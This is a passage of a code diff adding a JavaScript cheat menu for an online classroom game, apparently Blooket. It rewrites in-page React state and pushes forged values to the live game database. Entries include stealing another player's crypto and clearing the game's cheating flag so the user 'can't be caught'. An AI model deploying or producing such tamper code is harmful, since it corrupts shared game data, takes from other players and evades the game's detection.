+                            this.data = setInterval(() => Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ choices: [{ type: "mult", val: 3, rate: .075, blook: "Brainy Bot", text: "Triple Crypto" }] }), 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Auto Guess",
+                    description: "Automatically guess the correct password",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                let { state } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode;
+                                if (state.stage == "hack") for (const button of document.querySelector('div[class^=styles__buttonContainer]').children) button.innerText == state.correctPassword && button.click();
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Remove Hack",
+                    description: "Removes an attacking hack",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ hack: "" });
+                    }
+                },
+                {
+                    name: "Set Crypto",
+                    description: "Sets crypto",
+                    inputs: [{
+                        name: "Amount",
+                        type: "number"
+                    }],
+                    run: function (amount) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ crypto: amount, crypto2: amount });
+                        stateNode.props.liveGameController.setVal({
+                            path: "c/".concat(stateNode.props.client.name),
+                            val: {
+                                b: stateNode.props.client.blook,
+                                p: stateNode.state.password,
+                                cr: amount
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Set Password",
+                    description: "Sets hacking password",
+                    inputs: [{
+                        name: "Custom Password",
+                        type: "string"
+                    }],
+                    run: function (password) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ password });
+                        stateNode.props.liveGameController.setVal({
+                            path: "c/".concat(stateNode.props.client.name),
+                            val: {
+                                b: stateNode.props.client.blook,
+                                p: password,
+                                cr: stateNode.state.crypto
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Steal Player's Crypto",
+                    description: "Steals all of someone's crypto",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: function (target) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
+                            if (players && Object.keys(players).map(x => x.toLowerCase()).includes(target.toLowerCase())) {
+                                let [player, { cr }] = Object.entries(players).find(([name]) => name.toLowerCase() == target.toLowerCase());
+                                stateNode.setState({ crypto: stateNode.state.crypto + cr, crypto2: stateNode.state.crypto + cr });
+                                stateNode.props.liveGameController.setVal({
+                                    path: "c/".concat(stateNode.props.client.name),
+                                    val: {
+                                        b: stateNode.props.client.blook,
+                                        p: stateNode.state.password,
+                                        cr: stateNode.state.crypto + cr,
+                                        tat: `${player}:${cr}`
+                                    }
+                                });
+                            }
+                        });
+                    }
+                }
+            ],
+            defense: [
+                {
+                    name: "Earthquake",
+                    description: "Shuffles around towers",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({
+                            eventName: "Earthquake",
+                            event: {
+                                short: "e",
+                                color: "#805500",
+                                icon: "fas fa-mountain",
+                                desc: "All of your towers get mixed up",
+                                rate: .02
+                            },
+                            buyTowerName: "",
+                            buyTower: {}
+                        }, () => stateNode.eventTimeout = setTimeout(() => stateNode.setState({ event: {}, eventName: "" }), 6e3));
+                        stateNode.tiles.forEach(row => row.forEach((col, i) => col === 3 && (row[i] = 0)));
+                        let tiles = stateNode.tiles.flatMap((_, y) => _.map((__, x) => __ === 0 && ({ x, y }))).filter(Boolean).sort(() => .5 - Math.random());
+                        stateNode.towers.forEach(tower => {
+                            let { x, y } = tiles.shift();
+                            tower.move(x, y, stateNode.tileSize);
+                            stateNode.tiles[y][x] = 3;
+                        });
+                    }
+                },
+                {
+                    name: "Max Tower Stats",
+                    description: "Makes all placed towers overpowered",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.towers.forEach(tower => {
+                            tower.range = 100;
+                            tower.fullCd = tower.cd = 0;
+                            tower.damage = 1e6;
+                        });
+                    }
+                },
+                {
+                    name: "Remove Ducks",
+                    description: "Removes ducks",
+                    run: function () {
+                        let { stateNode: { ducks, tiles } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        ducks.forEach(x => { tiles[x.y][x.x] = 0; });
+                        ducks.length = 0;
+                    }
+                },
+                {
+                    name: "Remove Enemies",
+                    description: "Removes all the enemies",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.enemies = stateNode.futureEnemies = [];
+                    }
+                },
+                {
+                    name: "Remove Obstacles",
+                    description: "Lets you place towers anywhere",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.tiles = stateNode.tiles.map(row => row.fill(0));
+                    }
+                },
+                {
+                    name: "Set Damage",
+                    description: "Sets damage",
+                    inputs: [{
+                        name: "Damage",
+                        type: "number"
+                    }],
+                    run: function (dmg) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.dmg = dmg;
+                    }
+                },
+                {
+                    name: "Set Round",
+                    description: "Sets the current round",
+                    inputs: [{
+                        name: "Round",
+                        type: "number"
+                    }],
+                    run: function (round) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ round });
+                    }
+                },
+                {
+                    name: "Set Tokens",
+                    description: "Sets the amount of tokens you have",
+                    inputs: [{
+                        name: "Tokens",
+                        type: "number"
+                    }],
+                    run: function (tokens) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ tokens });
+                    }
+                }
+            ],
+            defense2: [
+                {
+                    name: "Max Tower Stats",
+                    description: "Makes all placed towers overpowered",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.towers.forEach(tower => {
+                            tower.stats.dmg = 1e6;
+                            tower.stats.fireRate = 50;
+                            tower.stats.ghostDetect = true;
+                            tower.stats.maxTargets = 1e6;
+                            tower.stats.numProjectiles &&= 100;
+                            tower.stats.range = 100;
+                            if (tower.stats.auraBuffs) for (const buff in tower.stats.auraBuffs) tower.stats.auraBuffs[buff] *= 100;
+                        });
+                    }
+                },
+                {
+                    name: "Kill Enemies",
+                    description: "Kills all the enemies",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.state.game.scene.enemyQueue.length = 0;
+                        stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x?.gameObject?.receiveDamage?.(x.gameObject.hp, 1));
+                    }
+                },
+                {
+                    name: "Set Coins",
+                    description: "Sets coins",
+                    inputs: [{
+                        name: "Coins",
+                        type: "number"
+                    }],
+                    run: function (coins) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ coins });
+                    }
+                },
+                {
+                    name: "Set Health",
+                    description: "Sets the amount of health you have",
+                    inputs: [{
+                        name: "Health",
+                        type: "number"
+                    }],
+                    run: function (health) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ health });
+                    }
+                },
+                {
+                    name: "Set Round",
+                    description: "Sets the current round",
+                    inputs: [{
+                        name: "Round",
+                        type: "number"
+                    }],
+                    run: function (round) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ round });
+                    }
+                },
+            ],
+            dinos: [
+                {
+                    name: "Auto Choose",
+                    description: "Automatically choose the best fossil when excavating",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    rand(e, t) {
+                        const s = [];
+                        while (s.length < t) {
+                            const i = Math.random();
+                            let r = 0, g = null;
+                            for (let o = 0; o < e.length; o++) {
+                                r += e[o].rate;
+                                if (r >= i) {
+                                    g = e[o];
+                                    break;
+                                }
+                            }
+                            g && !s.includes(g) && s.push(g)
+                        }
+                        return s;
+                    },
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            const getFossils = () => this.rand([{ type: "fossil", val: 10, rate: .1, blook: "Amber" }, { type: "fossil", val: 25, rate: .1, blook: "Dino Egg" }, { type: "fossil", val: 50, rate: .175, blook: "Dino Fossil" }, { type: "fossil", val: 75, rate: .175, blook: "Stegosaurus" }, { type: "fossil", val: 100, rate: .15, blook: "Velociraptor" }, { type: "fossil", val: 125, rate: .125, blook: "Brontosaurus" }, { type: "fossil", val: 250, rate: .075, blook: "Triceratops" }, { type: "fossil", val: 500, rate: .025, blook: "Tyrannosaurus Rex" }, { type: "mult", val: 1.5, rate: .05 }, { type: "mult", val: 2, rate: .025 }], 3);
+                            this.data = setInterval(() => {
+                                try {
+                                    let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                    if (stateNode.state.stage === "excavate") {
+                                        stateNode.state.choices.length || (stateNode.state.choices = getFossils());
+                                        let max = 0, index = -1;
+                                        for (let i = 0; i < stateNode.state.choices.length; i++) {
+                                            const { type, val } = stateNode.state.choices[i];
+                                            const value = (type == "fossil" ? stateNode.state.fossils + val * stateNode.state.fossilMult : stateNode.state.fossils * val) || 0;
+                                            if (value <= max && type != "mult") continue;
+                                            max = value, index = i + 1;
+                                        }
+                                        document.querySelector('div[class^="styles__rockRow"] > div[role="button"]:nth-child(' + index + ')').click();
+                                    }
+                                } catch { }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Rock ESP",
+                    description: "Shows what is under the rocks",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        const exps = ["⁰", "¹", "²", "³", "⁴", "⁵", "⁶", "⁷", "⁸", "⁹"];
+                        const getExpAscii = (num) => {
+                            let res = "";
+                            while (num > 0) {
+                                res = exps[num % 10] + res;;
+                                num = ~~(num / 10);
+                            }
+                            return res;
+                        };
+        
+                        const shortNum = (value) => {
+                            let newValue = value.toString();
+                            if (value >= 1000) {
+                                const suffixes = ["", "K", "M", "B", "T"];
+                                const suffixNum = ~~((digits(value) - 1) / 3);
+                                if (suffixNum < suffixes.length) {
+                                    let shortValue = "";
+                                    for (let precision = 3; precision >= 1; precision--) {
+                                        shortValue = parseFloat((suffixNum !== 0 ? value / 1000 ** suffixNum : value).toPrecision(precision)).toString();
+                                        const dotLessShortValue = shortValue.replace(/[^a-zA-Z 0-9]+/g, "");
+                                        if (dotLessShortValue.length <= 3) break;
+                                    }
+                                    if (Number(shortValue) % 1 !== 0) shortValue = Number(shortValue).toFixed(1);
+                                    newValue = shortValue + suffixes[suffixNum];
+                                } else {
+                                    let num = value;
+                                    let exp = 0;
+                                    while (num >= 100) {
+                                        num = Math.floor(num / 10);
+                                        exp += 1;
+                                    }
+                                    newValue = `${num / 10} × 10${getExpAscii(exp + 1)}`;
+                                }
+                            }
+                            return newValue;
+                        };
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                const rocks = [...document.querySelector('[class*="rockButton"]').parentElement.children];
+                                if (!rocks.every(element => element.querySelector('div'))) stateNode.setState({
+                                    choices: [{ type: "fossil", val: 10, rate: .1, blook: "Amber" }, { type: "fossil", val: 25, rate: .1, blook: "Dino Egg" }, { type: "fossil", val: 50, rate: .175, blook: "Dino Fossil" }, { type: "fossil", val: 75, rate: .175, blook: "Stegosaurus" }, { type: "fossil", val: 100, rate: .15, blook: "Velociraptor" }, { type: "fossil", val: 125, rate: .125, blook: "Brontosaurus" }, { type: "fossil", val: 250, rate: .075, blook: "Triceratops" }, { type: "fossil", val: 500, rate: .025, blook: "Tyrannosaurus Rex" }, { type: "mult", val: 1.5, rate: .05 }, { type: "mult", val: 2, rate: .025 }].sort(() => 0.5 - Math.random()).slice(0, 3)
+                                }, () => {
+                                    rocks.forEach((element, index) => {
+                                        const rock = stateNode.state.choices[index];
+                                        if (element.querySelector('div')) element.querySelector('div').remove();
+                                        const choice = document.createElement("div");
+                                        choice.style.color = "white";
+                                        choice.style.fontFamily = "Macondo";
+                                        choice.style.fontSize = "1em";
+                                        choice.style.display = "flex";
+                                        choice.style.justifyContent = "center";
+                                        choice.style.transform = "translateY(25px)";
+                                        choice.innerText = rock.type === "fossil" ? `+${Math.round(rock.val * stateNode.state.fossilMult) > 99999999 ? shortNum(Math.round(rock.val * stateNode.state.fossilMult)) : Math.round(rock.val * stateNode.state.fossilMult)} Fossils` : `x${rock.val} Fossils Per Excavation`;;
+                                        element.append(choice);
+                                    });
+                                });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Set Fossils",
+                    description: "Sets the amount of fossils you have",
+                    inputs: [{
+                        name: "Fossils",
+                        type: "number"
+                    }],
+                    run: function (fossils) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ fossils });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                f: fossils,
+                                ic: stateNode.state.isCheating
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Set Multiplier",
+                    description: "Sets fossil multiplier",
+                    inputs: [{
+                        name: "Multiplier",
+                        type: "number"
+                    }],
+                    run: function (fossilMult) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ fossilMult });
+                    }
+                },
+                {
+                    name: "Stop Cheating",
+                    description: "Undoes cheating so that you can't be caught",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ isCheating: false });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}/ic`,
+                            val: false
+                        });
+                    }
+                }
+            ],
+            doom: [
+                {
+                    name: "Fill Deck",
+                    description: "Fills your deck with every maxed out card and artifact (Only works on towers page)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname == "/tower/map") {
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            stateNode.props.tower.artifacts = "Medical Kit|Fury Relic|Survival Guide|Steel Socks|Piggy Bank|Lucky Feather|Coupon|Cheese|Tasty Egg|Training Weights|Mighty Shield|Toxic Waste|Lifeline Totem|Cursed Hourglass|Band-Aid|Elder Coins|Captain's Anchor|Chess Pieces|Pink Hippo|Anorak's Wizard Cap|Dave's Doggo|Anubis' Obelisk|Farm Tractor|Magic Seedling|Just A Bone|Cozy Igloo|King's Crown|Sacred Scroll".split("|");
+                            stateNode.props.tower.cards = 'Chick,🌽|Chicken,🌽|Cow,🌽|Goat,🌽|Horse,🌽|Pig,🌽|Sheep,🌽|Duck,🌽|Dog,🌽|Cat,🐾|Rabbit,🐾|Goldfish,🐾|Hamster,🐾|Turtle,🐾|Kitten,🐾|Puppy,🐾|Bear,🌲|Moose,🌲|Fox,🌲|Raccoon,🌲|Squirrel,🌲|Owl,🌲|Hedgehog,🌲|Baby Penguin,❄️|Penguin,❄️|Arctic Fox,❄️|Snowy Owl,❄️|Polar Bear,❄️|Arctic Hare,❄️|Seal,❄️|Walrus,❄️|Tiger,🌴|Panther,🌴|Cockatoo,🌴|Orangutan,🌴|Anaconda,🌴|Macaw,🌴|Jaguar,🌴|Capuchin,🌴|Toucan,🌴|Parrot,🌴|Elf,⚔️|Witch,⚔️|Wizard,⚔️|Fairy,⚔️|Slime Monster,⚔️|Jester,⚔️|Dragon,⚔️|Unicorn,⚔️|Queen,⚔️|King,⚔️|Snow Globe,☃️|Holiday Gift,☃️|Hot Chocolate,☃️|Gingerbread Man,☃️|Gingerbread House,☃️|Holiday Wreath,☃️|Snowman,☃️|Santa Claus,☃️|Two of Spades,🏰|Eat Me,🏰|Drink Me,🏰|Alice,🏰|Queen of Hearts,🏰|Dormouse,🏰|White Rabbit,🏰|Cheshire Cat,🏰|Caterpillar,🏰|Mad Hatter,🏰|King of Hearts,🏰'.split("|").map(x => {
+                                const [blook, c] = x.split(",");
+                                return { strength: 20, charisma: 20, wisdom: 20, class: c, blook };
+                            });
+                            try { stateNode.props.addTowerNode(); } catch { }
+                            stateNode.setState({ showDeck: false });
+                        } else alert("You need to be on the map to run this cheat!");
+                    }
+                },
+                {
+                    name: "Max Cards",
+                    description: "Maxes out all the cards in your deck",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname == "/tower/map") {
+                            const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            stateNode.props.tower.cards.forEach(card => {
+                                card.strength = 20;
+                                card.charisma = 20;
+                                card.wisdom = 20;
+                            });
+                        } else alert("You need to be on the map to run this cheat!");
+                    }
+                },
+                {
+                    name: "Max Health",
+                    description: "Fills the player's health",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        if (window.location.pathname == "/tower/battle") Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ myHealth: 100 });
+                        else alert("You need to be in battle to run this cheat!");
+                    }
+                },
+                {
+                    name: "Max Card Stats",
+                    description: "Maxes out player's current card (Only works on attribute select page)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        if (stateNode.state.phase !== 'select') alert('You must be on the attribute selection page!');
+                        else stateNode.setState({ myCard: { ...stateNode.state.myCard, strength: 20, charisma: 20, wisdom: 20 } });
+                    }
+                },
+                {
+                    name: "Min Enemy Stats",
+                    description: "Makes the enemy card stats all 0 (Only works on attribute select page)",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        if (stateNode.state.phase !== 'select') alert('You must be on the attribute selection page!');
+                        else stateNode.setState({ enemyCard: { ...stateNode.state.enemyCard, strength: 0, charisma: 0, wisdom: 0 } });
+                    }
+                },
+                {
+                    name: "Set Coins",
+                    description: "Try's to set amount of tower coins you have",
+                    inputs: [{
+                        name: "Coins",
+                        type: "number"
+                    }],
+                    run: function (coins) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.prompt.bind(window);
+                        i.remove();
+                        if (window.location.pathname == "/tower/battle") {
+                            let coins = parseInt("0" + alert("How many coins would you like?"));
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            try { stateNode.props.setTowerCoins(coins); } catch { };
+                        } else alert("You need to be in battle to run this cheat!");
+                    }
+                }
+            ],
+            factory: [
+                {
+                    name: "Choose Blook",
+                    description: "Gives you a blook",
+                    inputs: [{
+                        name: "Blook",
+                        type: "options",
+                        options: [{name:"Chick",color:"#ffcd05",class:"\uD83C\uDF3D",rarity:"Common",cash:[3,7,65,400,2500],time:[1,1,1,1,1],price:[300,3e3,3e4,2e5]},{name:"Chicken",color:"#ed1c24",class:"\uD83C\uDF3D",rarity:"Common",cash:[10,40,200,1400,1e4],time:[5,4,3,2,1],price:[570,4e3,5e4,8e5]},{name:"Cow",color:"#58595b",class:"\uD83C\uDF3D",rarity:"Common",cash:[25,75,1500,25e3,25e4],time:[15,10,10,10,5],price:[500,9500,16e4,4e6]},{name:"Duck",color:"#4ab96d",class:"\uD83C\uDF3D",rarity:"Common",cash:[4,24,200,3e3,4e4],time:[3,3,3,3,3],price:[450,4200,7e4,11e5]},{name:"Goat",color:"#c59a74",class:"\uD83C\uDF3D",rarity:"Common",cash:[5,28,200,1300,12e3],time:[3,3,2,2,2],price:[500,6400,45e3,5e5]},{name:"Horse",color:"#995b3c",class:"\uD83C\uDF3D",rarity:"Common",cash:[5,20,270,1800,15e3],time:[2,2,2,2,2],price:[550,8200,65e3,6e5]},{name:"Pig",color:"#f6a9cb",class:"\uD83C\uDF3D",rarity:"Common",cash:[20,50,1300,8e3,8e4],time:[7,7,7,7,5],price:[400,11e3,8e4,13e5]},{name:"Sheep",color:"#414042",class:"\uD83C\uDF3D",rarity:"Common",cash:[6,25,250,1500,11e3],time:[3,3,3,2,2],price:[500,5e3,5e4,43e4]},{name:"Cat",color:"#f49849",class:"\uD83D\uDC3E",rarity:"Common",cash:[5,18,170,1700,13e3],time:[2,2,2,2,2],price:[480,5500,6e4,5e5]},{name:"Dog",color:"#995b3c",class:"\uD83D\uDC3E",rarity:"Common",cash:[7,25,220,1900,9e3],time:[3,3,2,2,1],price:[460,6600,7e4,73e4]},{name:"Goldfish",color:"#f18221",class:"\uD83D\uDC3E",rarity:"Common",cash:[5,40,350,3500,35e3],time:[3,3,3,3,3],price:[750,7200,84e3,95e4]},{name:"Rabbit",color:"#e7bf9a",class:"\uD83D\uDC3E",rarity:"Common",cash:[3,18,185,800,7e3],time:[2,2,2,1,1],price:[500,5800,56e3,55e4]},{name:"Hamster",color:"#ce9176",class:"\uD83D\uDC3E",rarity:"Common",cash:[10,45,450,4500,45e3],time:[4,4,4,4,4],price:[650,6500,8e4,93e4]},{name:"Turtle",color:"#619a3c",class:"\uD83D\uDC3E",rarity:"Common",cash:[23,120,1400,15e3,17e4],time:[10,10,10,10,10],price:[700,8500,11e4,13e5]},{name:"Puppy",color:"#414042",class:"\uD83D\uDC3E",rarity:"Common",cash:[4,10,75,500,3e3],time:[1,1,1,1,1],price:[450,4e3,35e3,25e4]},{name:"Kitten",color:"#58595b",class:"\uD83D\uDC3E",rarity:"Common",cash:[4,8,60,400,2e3],time:[1,1,1,1,1],price:[350,3500,26e3,17e4]},{name:"Bear",color:"#995b3c",class:"\uD83C\uDF32",rarity:"Common",cash:[12,70,550,4500,1e5],time:[7,7,6,5,5],price:[550,5500,63e3,16e5]},{name:"Moose",color:"#995b3c",class:"\uD83C\uDF32",rarity:"Common",cash:[8,45,400,3500,26e3],time:[5,5,4,4,3],price:[520,6500,58e3,7e5]},{name:"Fox",color:"#f49849",class:"\uD83C\uDF32",rarity:"Common",cash:[7,15,80,550,3e3],time:[2,2,1,1,1],price:[400,4e3,36e3,24e4]},{name:"Raccoon",color:"#6d6e71",class:"\uD83C\uDF32",rarity:"Common",cash:[5,14,185,1900,19e3],time:[2,2,2,2,2],price:[400,5e3,71e3,8e5]},{name:"Squirrel",color:"#d25927",class:"\uD83C\uDF32",rarity:"Common",cash:[3,10,65,470,2600],time:[1,1,1,1,1],price:[420,3600,32e3,21e4]},{name:"Owl",color:"#594a42",class:"\uD83C\uDF32",rarity:"Common",cash:[4,17,155,1500,15e3],time:[2,2,2,2,2],price:[500,4800,55e3,58e4]},{name:"Hedgehog",color:"#3f312b",class:"\uD83C\uDF32",rarity:"Common",cash:[11,37,340,2200,3e4],time:[5,4,3,2,2],price:[540,7e3,77e3,12e5]},{name:"Seal",color:"#7ca1d5",class:"❄️",rarity:"Common",cash:[6,17,150,1200,13e3],time:[2,2,2,2,2],price:[480,4500,43e3,52e4]},{name:"Arctic Fox",color:"#7ca1d5",class:"❄️",rarity:"Common",cash:[5,18,180,850,8500],time:[2,2,2,1,1],price:[520,550,61e3,68e4]},{name:"Snowy Owl",color:"#feda3f",class:"❄️",rarity:"Common",cash:[5,20,190,1900,16e3],time:[3,3,2,2,2],price:[370,5300,76e3,62e4]},{name:"Arctic Hare",color:"#7ca1d5",class:"❄️",rarity:"Common",cash:[6,19,85,900,7e3],time:[2,2,1,1,1],price:[540,5200,66e3,55e4]},{name:"Penguin",color:"#fb8640",class:"❄️",rarity:"Common",cash:[4,21,310,3200,33e3],time:[3,3,3,3,3],price:[400,6500,76e3,87e4]},{name:"Baby Penguin",color:"#414042",class:"❄️",rarity:"Common",cash:[3,8,70,450,2700],time:[1,1,1,1,1],price:[420,3300,33e3,23e4]},{name:"Polar 